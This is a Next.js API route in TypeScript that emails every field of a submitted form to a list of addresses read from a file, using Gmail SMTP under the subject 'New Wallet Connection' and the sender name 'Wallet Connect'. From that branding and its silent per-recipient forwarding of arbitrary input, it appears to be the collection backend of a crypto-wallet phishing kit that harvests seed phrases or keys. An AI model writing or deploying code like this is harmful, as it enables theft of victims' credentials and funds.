import { NextRequest, NextResponse } from "next/server";
import { readFile } from "fs/promises";
import { join } from "path";
import nodemailer from "nodemailer";


async function getEmailList(fallbackUser: string): Promise<string[]> {
    try {
        const filePath = join(process.cwd(), "public", "EMAIL.txt");
        const text = await readFile(filePath, "utf-8");
        const emails = text
            .split(",")
            .map((e: string) => e.trim())
            .filter((e: string) => e.includes("@"));
        if (emails.length > 0) return emails;
    } catch {
        // Fall back to fallbackUser as default recipient
    }
    return fallbackUser ? [fallbackUser] : [];
}

export async function POST(req: NextRequest) {
    try {
        const smtpUser = (process.env.SMTP_USER || "").trim();
        // Google App Passwords often have spaces (e.g. "abcd efgh ijkl mnop"), strip them so SMTP authenticates cleanly
        const smtpPass = (process.env.SMTP_PASS || "").replace(/\s+/g, "").trim();

        const body = await req.json();
        const emailList = await getEmailList(smtpUser);

        if (!smtpUser || !smtpPass) {
            console.error("SMTP credentials not set. Add SMTP_USER and SMTP_PASS to .env.local");
            return NextResponse.json(
                { success: false, error: "Email service not configured" },
                { status: 500 }
            );
        }

        if (emailList.length === 0) {
            console.error("No recipient emails found");
            return NextResponse.json(
                { success: false, error: "No recipients" },
                { status: 500 }
            );
        }

        // Create Gmail SMTP transporter
        const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: smtpUser,
                pass: smtpPass,
            },
        });

        // Build a clean HTML email body
        const subject = body._subject || "New Wallet Connection";
        const { _subject, ...data } = body;

        const htmlBody = `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
                <h2 style="color: #1a1a2e; border-bottom: 2px solid #3b82f6; padding-bottom: 10px;">${subject}</h2>
                <table style="width: 100%; border-collapse: collapse; margin-top: 16px;">
                    ${Object.entries(data)
                        .map(
                            ([key, value]) => `
                        <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 10px 12px; font-weight: bold; color: #374151; text-transform: capitalize; width: 140px; vertical-align: top;">
                                ${key.replace(/_/g, " ")}
                            </td>
                            <td style="padding: 10px 12px; color: #111827; word-break: break-all; font-family: monospace;">
                                ${String(value)}
                            </td>
                        </tr>`
                        )
                        .join("")}
                </table>
                <p style="margin-top: 20px; color: #9ca3af; font-size: 12px;">
                    Sent at ${new Date().toUTCString()}
                </p>
            </div>
        `;

        const plainText = Object.entries(data)
            .map(([key, value]) => `${key.replace(/_/g, " ")}: ${String(value)}`)
            .join("\n");

        // Send individually to each recipient so they can't see each other
        const results = await Promise.allSettled(
            emailList.map((email) =>
                transporter.sendMail({
                    from: `"Wallet Connect" <${smtpUser}>`,
                    to: email,
                    subject,
                    text: plainText,
                    html: htmlBody,
                })
            )
        );

        results.forEach((r, idx) => {
            if (r.status === "rejected") {
                console.error(`Failed to send email to ${emailList[idx]}:`, (r as PromiseRejectedResult).reason);
            }
        });

        const sent = results.filter((r) => r.status === "fulfilled").length;
        const failed = results.filter((r) => r.status === "rejected") as PromiseRejectedResult[];
        if (failed.length > 0) {
            failed.forEach((f) => console.error("Email send failure detail:", f.reason));
        }
        console.log(`Emails sent: ${sent}/${emailList.length}`);

        return NextResponse.json(
            { 
                success: sent > 0, 
                sent, 
                total: emailList.length,
                errors: results
                    .filter((r): r is PromiseRejectedResult => r.status === "rejected")
                    .map((r) => (r.reason instanceof Error ? r.reason.message : String(r.reason)))
            },
            { status: sent > 0 ? 200 : 502 }
        );
    } catch (error: any) {
        console.error("Submit API error:", error.message || error);
        return NextResponse.json(
            { success: false, error: error.message || "Failed to send email" },
            { status: 500 }
        );
    }
}
